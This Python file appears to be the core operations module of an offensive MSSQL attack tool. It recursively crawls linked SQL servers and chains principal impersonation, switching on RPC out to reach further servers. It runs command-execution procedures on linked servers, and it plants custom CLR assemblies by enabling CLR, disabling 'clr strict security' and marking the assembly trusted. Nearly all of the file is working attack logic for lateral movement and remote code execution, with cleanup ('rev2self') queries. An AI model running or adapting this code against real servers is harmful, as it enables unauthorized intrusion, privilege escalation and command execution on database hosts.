########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.3.1'
__email__ = ['El3ct71k@gmail.com']
########################################################

import os
import copy
import utilities
from impacket import LOG
from termcolor import colored
from classes import query_builder
from typing import Literal, Any, Union
from classes.base_sql_client import BaseSQLClient


class Operations(BaseSQLClient):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, args_options)
        self.high_privileged_server_roles = ['sysadmin']
        self.high_privileged_database_roles = ['db_owner']

        self.use_state = not args_options.no_state
        self.username = user_name
        self.server_address = server_address
        self.debug = args_options.debug
        self.state_filename = f"{server_address}_{user_name}.state"

        self.rev2self = dict()
        self.max_link_depth = args_options.max_link_depth
        self.max_impersonation_depth = args_options.max_impersonation_depth
        self.auto_yes = args_options.auto_yes
        self.custom_asm_directory = os.path.join('playbooks', 'custom-asm')
        self.operations_history = []
        self.deletion_list = set()

    def clone_chain_id(self, chain_id: str) -> str:
        """
            This function is responsible to clone the chain id.
        """
        new_chain_id = self.add_to_server_state(None, "cloned_from", chain_id)
        cloned = copy.deepcopy(self.state['servers_info'][chain_id])
        if cloned['chain_tree']:
            cloned['chain_tree'][-1][1] = new_chain_id
        self.add_to_server_state(new_chain_id, 'chain_tree', cloned['chain_tree'])
        self.add_to_server_state(new_chain_id, 'walkthrough', cloned['walkthrough'])
        self.add_to_server_state(new_chain_id, 'chain_id', new_chain_id)
        self.add_to_server_state(new_chain_id, "cloned_from", chain_id)
        return new_chain_id

    def add_to_server_state(self, chain_id: Union[str, None], key: str, value: Any) -> str:
        """
            This function is responsible to add the server items to the server state.
        """

        if not chain_id:
            chain_id = utilities.generate_link_id()
            self.state['servers_info'][chain_id] = {
                "hostname": "",
                "chain_str": "",
                "chain_tree": list(),
                "db_user": "",
                "db_name": "",
                "server_user": "",
                "link_name": "",
                "instance_name": "",
                "version": "",
                "domain_name": "",
                "available_databases": set(),
                "chain_id": chain_id,
                "server_principals": set(),
                "database_principals": set(),
                "server_roles": set(),
                "database_roles": set(),
                "trustworthy_db_list": set(),
                "adsi_providers": set(),
                "walkthrough": list(),
                "cloned_from": "",
            }

        if key not in self.state['servers_info'][chain_id].keys():
            raise Exception(f"Key {key} is not in the server state.")

        server_info = self.state['servers_info'][chain_id][key]
        if isinstance(server_info, list) or isinstance(server_info, set):
            if not isinstance(value, list):
                value = [value]
            for v in value:
                if isinstance(server_info, list):
                    self.state['servers_info'][chain_id][key].append(v)
                else:
                    self.state['servers_info'][chain_id][key].add(v)

        elif isinstance(server_info, dict):
            for k, v in value.items():
                self.state['servers_info'][chain_id][key][k] = v
        else:
            self.state['servers_info'][chain_id][key] = value
        return chain_id

    def filter_server_by_link_name(self, link_name: str) -> list:
        """
            This function is responsible to filter the server by link name.
        """
        link_information = utilities.filter_subdict_by_key(self.state['servers_info'], "link_name", link_name)
        if not link_information:
            return []
        link_information = link_information[0]
        servers = utilities.filter_subdict_by_key(self.state['servers_info'], "hostname", link_information['hostname'])
        for server in servers:
            if server['domain_name'] != link_information['domain_name']:
                continue
            yield server

    def generate_authentication_details(self, chain_id: str) -> str:
        """
            This function is responsible to generate authentication details.
        """
        server_info = self.state['servers_info'][chain_id]
        server_user = server_info['server_user']
        db_user = server_info['db_user']
        db_name = self.state['servers_info'][chain_id]['db_name']
        for operation_type, operation_value in server_info['walkthrough']:
            if not operation_value:
                continue
            if operation_type == 'server':
                server_user += f">{colored('I:', 'red')}{operation_value}"
            elif operation_type == 'database':
                db_user += f">{colored('I:', 'red')}{operation_value}"

        impersonation_details = f"{server_user}@{db_name}/{db_user}"
        return colored(impersonation_details, "cyan")

    def generate_chain_str(self, chain_id: str):
        """
            This function is responsible to generates chain string by chain id.
        """
        server_info = self.state['servers_info'][chain_id]
        if not server_info['chain_tree']:
            return server_info['hostname']

        chain_str = ""
        for link_name, new_chain_id in server_info['chain_tree']:
            authentication_details = self.generate_authentication_details(new_chain_id)
            chain_str += f" -> {colored(link_name, 'green')} ({authentication_details})"
        return chain_str.lstrip(" -> ")

    def is_valid_chain_id(self, chain_id: str) -> bool:
        """
            This function is responsible to check if the given chain id is valid.
        """
        if chain_id not in self.state['servers_info']:
            LOG.error(f"Chain id {chain_id} is not in the chain ids list")
            return False

        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Chosen chain: {chain_str} (ID: {chain_id})")
        return True

    def is_valid_link_server(self, link_name: str) -> bool:
        """
            This function is responsible to check if the given linked server is valid.
        """

        filtered_servers = list(self.filter_server_by_link_name(link_name))

        if not filtered_servers:
            LOG.error(f"{link_name} is not in the linked servers list")
            return False
        LOG.info(f"Chosen linked server: {link_name}")
        return True

    def is_link_in_chain(self, chain_id: str) -> bool:
        """
            This function is responsible to check if the given linked server is in the state.
        """

        current_server_info = self.state['servers_info'][chain_id]
        hosts_list = []
        for _, captured_chain in current_server_info['chain_tree']:
            server_info = self.state['servers_info'][captured_chain]
            hosts_list.append(f"{server_info['hostname']}.{server_info['domain_name']}")

        for host in hosts_list:
            if hosts_list.count(host) > 1:
                return True
        return False

    def detect_architecture(self, chain_id: str, arch: Literal['autodetect', 'x64', 'x86']) -> Union[str, None]:
        """
            This function is responsible to detect the architecture of a remote server.
        """
        if arch != 'autodetect':
            LOG.info(f"Architecture is set to {arch}")
            return arch

        server_info = self.state['servers_info'][chain_id]
        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Find architecture in {chain_str}")
        for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
            if x64_sig in server_info['version']:
                LOG.info("Architecture is x64")
                return "x64"
        for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
            if x86_sig in server_info['version']:
                LOG.info("Architecture is x86")
                return "x86"
        return None

    def is_privileged_user(self, chain_id: str, user_type: str) -> bool:
        """
            This function is responsible to check if the given user is privileged.
        """
        if user_type not in ['server', 'database']:
            raise ValueError("User type must be 'server' or 'database'")
        server_info = self.state['servers_info'][chain_id]
        current_user = server_info['server_user'] if user_type == 'server' else server_info['db_user']
        high_privileged_roles = self.high_privileged_server_roles \
            if user_type == 'server' else self.high_privileged_database_roles

        user_roles = server_info['server_roles'] if user_type == 'server' else server_info['database_roles']

        if current_user in high_privileged_roles:
            return True
        return utilities.is_string_in_lists(user_roles, high_privileged_roles)

    def is_impersonation_depth_exceeded(self, chain_id: str) -> int:
        """
            This function is responsible to check if the impersonation depth is exceeded.
        """
        server_info = self.state['servers_info'][chain_id]
        counter = 0
        for operation_type, operation_value in server_info['walkthrough']:
            if not operation_value:
                continue
            if operation_type in ['server', 'database']:
                counter += 1
        return counter >= self.max_impersonation_depth

    def retrieve_server_information(self, chain_id: Union[str, None], link_name: Union[str, None]) -> list:
        """
            This function is responsible to retrieve the server information.
        """
        queries = {
            "server_information": query_builder.get_server_information(),
            "trustworthy_db_list": query_builder.get_trustworthy_db_list(),
            "server_roles": query_builder.get_user_roles(user_type="server"),
            "db_roles": query_builder.get_user_roles(user_type="database"),
            "server_principals": query_builder.get_impersonation_list(user_type="server"),
            "database_principals": query_builder.get_impersonation_list(user_type="database"),
            "available_databases": query_builder.get_database_list()
        }
        required_queries = ["server_information"]
        dict_results = {}
        chain_str = self.generate_chain_str(chain_id) if chain_id else self.server_address
        for key, query in queries.items():
            results = self.build_chain(chain_id, query)

            if not results['is_success']:
                if key in required_queries:
                    LOG.error(f"Failed to retrieve server information from {chain_str}")
                    self.deletion_list.add(chain_id)
                    return
                continue
            dict_results[key] = results['results']

        if not dict_results['server_information']:
            LOG.error(f"Failed to retrieve server information from {chain_str}")
            self.deletion_list.add(chain_id)
            return
        db_user = dict_results['server_information'][0]['db_user']
        server_user = dict_results['server_information'][0]['server_user']
        db_name = dict_results['server_information'][0]['db_name']

        hostname = utilities.remove_instance_name(dict_results['server_information'][0]['hostname'])

        domain_name = dict_results['server_information'][0]['domain_name']
        server_version = dict_results['server_information'][0]['server_version']
        instance_name = dict_results['server_information'][0]['instance_name']

        if not link_name:
            LOG.info(f"Discovered hostname: {hostname}")
            self.state['hostname'] = hostname
            chain_id = self.add_to_server_state(chain_id, "hostname", hostname)
            self.add_to_server_state(chain_id, "chain_tree", [[hostname, chain_id]])

        server_info = self.state['servers_info'][chain_id]
        link_name = link_name if link_name else hostname

        for k, v in {"hostname": hostname, "link_name": link_name, "db_user": db_user,
                     "server_user": server_user, "version": server_version, "db_name": db_name,
                     "domain_name": domain_name, "instance_name": instance_name}.items():
            chain_id = self.add_to_server_state(chain_id, k, v)

        if 'trustworthy_db_list' in dict_results.keys():
            for db_name in dict_results['trustworthy_db_list']:
                chain_id = self.add_to_server_state(chain_id, "trustworthy_db_list", db_name['name'])

        if 'available_databases' in dict_results.keys():
            for db_name in dict_results['available_databases']:
                chain_id = self.add_to_server_state(chain_id, "available_databases", db_name['name'])

        if 'server_roles' in dict_results.keys():
            for server_role in dict_results['server_roles']:
                chain_id = self.add_to_server_state(chain_id, "server_roles", server_role['group'])

        if 'db_roles' in dict_results.keys():
            for db_role in dict_results['db_roles']:
                chain_id = self.add_to_server_state(chain_id, "database_roles", db_role['group'])

        if 'server_principals' in dict_results.keys():
            for server_principal in dict_results['server_principals']:
                if server_principal['username'] == server_user:
                    continue

                if server_principal['username'] in server_info['server_principals']:
                    continue
                LOG.info(f"Discovered server principal: {server_principal['username']} on {chain_str}")
                chain_id = self.add_to_server_state(chain_id, "server_principals", server_principal['username'])

        if 'database_principals' in dict_results.keys():
            for db_principal in dict_results['database_principals']:
                if db_principal['username'] == db_user:
                    continue

                if db_principal['username'] in server_info['database_principals']:
                    continue
                LOG.info(f"Discovered database principal: {db_principal['username']} on {chain_str}")
                chain_id = self.add_to_server_state(chain_id, "database_principals", db_principal['username'])
        chain_id = self.add_to_server_state(chain_id, "chain_str", self.generate_chain_str(chain_id))

        for user_type in ['server', 'database']:
            if not self.is_privileged_user(chain_id, user_type):
                continue
            privileged_users = self.build_chain(chain_id, query_builder.get_user_list(user_type))
            if not privileged_users['is_success']:
                continue
            for user in privileged_users['results']:
                if user['username'] == db_user or user['username'] == server_user:
                    continue
                if user['username'] in server_info[f'{user_type}_principals']:
                    continue
                LOG.info(f"Discovered {user_type} principal: {user['username']} on {chain_str}")
                chain_id = self.add_to_server_state(chain_id, f"{user_type}_principals", user['username'])

        LOG.info(f"Server information from {chain_str} is retrieved")

        for walkthrough in server_info['walkthrough']:
            self.operations_history.append(walkthrough)
        yield chain_id

        if self.is_impersonation_depth_exceeded(chain_id):
            LOG.warning(f"Max impersonation depth reached for {chain_str}")
            return
        for principal_type in ["server_principals", "database_principals"]:
            p_type = "server" if principal_type == "server_principals" else "database"
            for principal in server_info[principal_type]:
                if (p_type, hostname, principal) in self.operations_history:
                    LOG.warning(f"Principal {principal} already weaponized on {hostname}")
                    continue

                walkthrough = (principal_type.replace("_principals", ""), principal)
                if walkthrough in server_info['walkthrough']:
                    continue

                clone_chain_id = self.clone_chain_id(chain_id)
                self.add_to_server_state(clone_chain_id, 'walkthrough', walkthrough)
                yield from self.retrieve_server_information(clone_chain_id, link_name)

    def set_server_options(self, chain_id: str, link_name: str, feature: str, status: Literal['true', 'false']) -> None:
        """
            This function is responsible to set the server options.
        """
        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Set {feature} to {status} on {chain_str}")
        set_server_option = self.build_chain(chain_id, query_builder.set_server_options(link_name, feature, status),
                                             method="exec_at")
        if set_server_option['is_success']:
            rev2sef_status = 'true' if status == 'false' else 'false'
            self.add_rev2self_query(chain_id, query_builder.set_server_options(link_name, feature, rev2sef_status),
                                    template=set_server_option['template'])

    def delete_non_relevant_chains(self) -> None:
        """
            This function is responsible to delete the non-relevant chains.
        """
        for chain_id in self.deletion_list:
            del self.state['servers_info'][chain_id]
        self.deletion_list.clear()

    def retrieve_links(self, chain_id: str) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        server_info = self.state['servers_info'][chain_id]
        chain_str = self.generate_chain_str(chain_id)
        if len(self.state['servers_info'][chain_id]['chain_tree']) > self.max_link_depth:
            LOG.info(f"Reached max depth for chain {chain_str} (Max depth: {self.max_link_depth})")
            return

        linkable_servers_results = self.build_chain(chain_id, query_builder.get_linked_server_list())
        if not linkable_servers_results['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {chain_str}")
            return

        for row in linkable_servers_results['results']:

            link_name = utilities.remove_instance_name(row['name'])
            if row['provider'].lower() == "adsdsoobject":
                self.add_to_server_state(chain_id, "adsi_providers", link_name)
                continue

            if not row['is_remote_login_enabled']:
                LOG.info(f"Remote login is disabled on {link_name}")
                self.set_server_options(chain_id, link_name, 'rpc', 'true')
            if not row['is_rpc_out_enabled']:
                LOG.info(f"RPC out is disabled on {link_name}")
                self.set_server_options(chain_id, link_name, 'rpc out', 'true')

            chain_str = f"{chain_str} -> {link_name}"
            new_chain_id = self.add_to_server_state(None, "link_name", link_name)
            new_chain_id = self.add_to_server_state(new_chain_id, "chain_tree",
                                                    server_info['chain_tree'] + [[link_name, new_chain_id]])
            for collected_chain_id in self.retrieve_server_information(new_chain_id, link_name):
                if self.is_link_in_chain(collected_chain_id):
                    LOG.info(f"Link {link_name} already in chain {chain_str}")
                    self.deletion_list.add(collected_chain_id)
                    continue
                if len(self.state['servers_info'][collected_chain_id]['chain_tree']) > self.max_link_depth:
                    LOG.info(f"Reached max depth for chain {chain_str} (Max depth: {self.max_link_depth})")
                    continue
                self.retrieve_links(collected_chain_id)

    def direct_query(self, chain_id: str, query: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                     decode_results: bool = True, print_results: bool = False) -> bool:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(chain_id, query, method, decode_results, print_results)
        if not results['is_success']:
            LOG.error(f"Failed to execute query: {query}")
            return False

        if not results['results']:
            LOG.info(f"No results found for query: {query}")
            return True

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

        return True

    def reconfigure_procedure(self, chain_id: str, procedure: str, required_status: bool) -> bool:
        """
        This function is responsible to enable a procedure on the server.
        """
        is_procedure_enabled = self.build_chain(chain_id, query_builder.is_procedure_enabled(procedure))

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_enabled status")
            return False

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_executable status")
            return False

        if is_procedure_enabled['results'] and is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
            LOG.warning(
                f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")

            LOG.info(f"{procedure} needs to be configured")
            status = 1 if required_status else 0
            rev2self_status = 0 if required_status else 1
            LOG.info(f"Reconfiguring {procedure}")
            reconfigure_procedure = self.build_chain(chain_id, query_builder.reconfigure_procedure(procedure, status),
                                                     method="exec_at")
            if reconfigure_procedure['is_success']:
                self.add_rev2self_query(chain_id,
                                        query_builder.reconfigure_procedure(procedure, rev2self_status),
                                        template=reconfigure_procedure['template'])
            else:
                LOG.warning(f"Failed to enable {procedure}")
        return True

    def execute_procedure(self, chain_id: str, procedure: str, command: str, reconfigure: bool = False) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """
        is_procedure_accessible = self.build_chain(chain_id, query_builder.is_procedure_accessible(procedure))

        if (not is_procedure_accessible['is_success']) or \
                is_procedure_accessible['results'][0]['is_accessible'] != 'True':
            LOG.error(f"{procedure} is not accessible")
            return False

        if reconfigure:
            if not self.reconfigure_procedure(chain_id, "show advanced options", required_status=True):
                return False

            if not self.reconfigure_procedure(chain_id, procedure, required_status=True):
                return False

        procedure_query = query_builder.execute_procedure(procedure, command)
        execute_procedure_res = self.build_chain(chain_id, procedure_query, method="exec_at")
        chain_str = self.generate_chain_str(chain_id)
        if not execute_procedure_res['is_success']:
            LOG.warning(f"Failed to execute {procedure} on {chain_str}")
            if not reconfigure:
                return self.execute_procedure(chain_id, procedure, command, reconfigure=True)
            return False

        LOG.info(f"The {procedure} command executed successfully on {chain_str}")
        if not execute_procedure_res['results']:
            LOG.warning("Failed to resolve the results")
            return True

        for result in execute_procedure_res['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def add_new_custom_asm(self, chain_id: str, asm_file_location: str, asm_name: str) -> bool:
        """
        This function is responsible to add a new custom assembly to the server.
        """
        if not os.path.exists(asm_file_location):
            LOG.error(f"Cannot find {asm_file_location}")
            return False
        is_asm_exists = self.build_chain(chain_id, query_builder.is_assembly_exists(asm_name))
        if is_asm_exists['is_success'] and is_asm_exists['results'][0]['status'] == 'True':
            LOG.info(f"{asm_name} assembly is already exists")
            return True

        custom_asm_hex = utilities.hexlify_file(asm_file_location)
        if not self.reconfigure_procedure(chain_id, 'show advanced options', required_status=True):
            LOG.error("Failed to enable show advanced options")
            return False

        if not self.reconfigure_procedure(chain_id, 'clr enabled', required_status=True):
            LOG.error("Failed to enable clr")
            return False

        if not self.reconfigure_procedure(chain_id, 'clr strict security', required_status=False):
            LOG.error("Failed to disable clr strict security")
            return False

        is_app_trusted = self.build_chain(chain_id, query_builder.is_app_trusted(asm_file_location))

        if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
            trust_asm = self.build_chain(chain_id, query_builder.trust_my_app(asm_file_location),
                                         method="exec_at")
            if not trust_asm['is_success']:
                LOG.error("Failed to trust our custom assembly")
                return False

            LOG.info(f"Trusting our custom assembly")
            self.add_rev2self_query(chain_id, query_builder.untrust_my_app(asm_file_location),
                                    template=trust_asm['template'])
        add_custom_asm = self.build_chain(chain_id, query_builder.add_custom_assembly(asm_name, custom_asm_hex),
                                          method="exec_at", indicates_success=['already exists in database'])
        if not add_custom_asm['is_success']:
            LOG.error(f"Failed to add custom assembly")
            return False
        self.add_rev2self_query(chain_id, query_builder.drop_assembly(asm_name), template=add_custom_asm['template'])
        LOG.info(f"Added custom assembly")
        return True

    def execute_custom_assembly_procedure(self, chain_id: str, asm_file_location: str, procedure_name: str,
                                          command: str, asm_name: str, args: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """

        if not self.add_new_custom_asm(chain_id, asm_file_location, asm_name):
            return False
        is_proc_exists = self.build_chain(chain_id, query_builder.is_procedure_exists(procedure_name))
        if is_proc_exists['is_success'] and is_proc_exists['results'][0]['status'] == 'True':
            LOG.info(f"{procedure_name} procedure is already exists")
        else:
            add_procedure = self.build_chain(chain_id,
                                             query_builder.create_procedure(asm_name, procedure_name, args),
                                             method="exec_at", indicates_success=['is already an object named'])

            if not add_procedure['is_success']:
                LOG.error(f"Failed to create procedure")
                return False
            self.add_rev2self_query(chain_id, query_builder.drop_procedure(procedure_name),
                                    template=add_procedure['template'])

        results = self.build_chain(chain_id, query_builder.execute_procedure(procedure_name, command), method="exec_at")
        if not results['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return False
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def execute_custom_assembly_function(self, chain_id: str, asm_file_location: str, function_name: str, args: str,
                                         class_name: str, namespace: str, command: str, asm_name: str,
                                         wait: bool = True) -> Union[None, dict]:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the function and execute it.
        """

        if not self.add_new_custom_asm(chain_id, asm_file_location, asm_name):
            return None
        is_func_exists = self.build_chain(chain_id, query_builder.is_function_exists(function_name))
        db_user = self.state['servers_info'][chain_id]['db_user']
        if is_func_exists['is_success'] and is_func_exists['results'][0]['status'] == 'True':
            LOG.info(f"{function_name} function is already exists")
        else:

            add_function = self.build_chain(chain_id,
                                            query_builder.create_function(db_user, function_name, asm_name, namespace,
                                                                          class_name, args),
                                            method="exec_at", indicates_success=['already an object named'])

            if not add_function['is_success']:
                LOG.error(f"Failed to create procedure")
                return None
            self.add_rev2self_query(chain_id, query_builder.drop_function(function_name),
                                    template=add_function['template'])

        function_execution = self.build_chain(chain_id, query_builder.execute_function(db_user, function_name, command),
                                              method="OpenQuery", wait=wait)
        if not function_execution['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return None
        LOG.info(f"Successfully executed custom assembly")
        return function_execution

    def configure_query_with_defaults(self, chain_id: str, query: str) -> str:
        """
        this function is responsible to add the default operations to a query
        """
        for operation_type, operation_value in self.state['servers_info'][chain_id]['walkthrough'][::-1]:
            if operation_type in ['server', 'database']:
                query = self.do_impersonation(operation_type, operation_value, query)

        return query

    def add_rev2self_query(self, chain_id: str, query: str, template: str) -> None:
        """
        This function is responsible to add a command to the rev2self queue.
        """

        if chain_id not in self.rev2self.keys():
            self.rev2self[chain_id] = []
        self.rev2self[chain_id].append(utilities.replace_strings(template, {"[PAYLOAD]": query}))
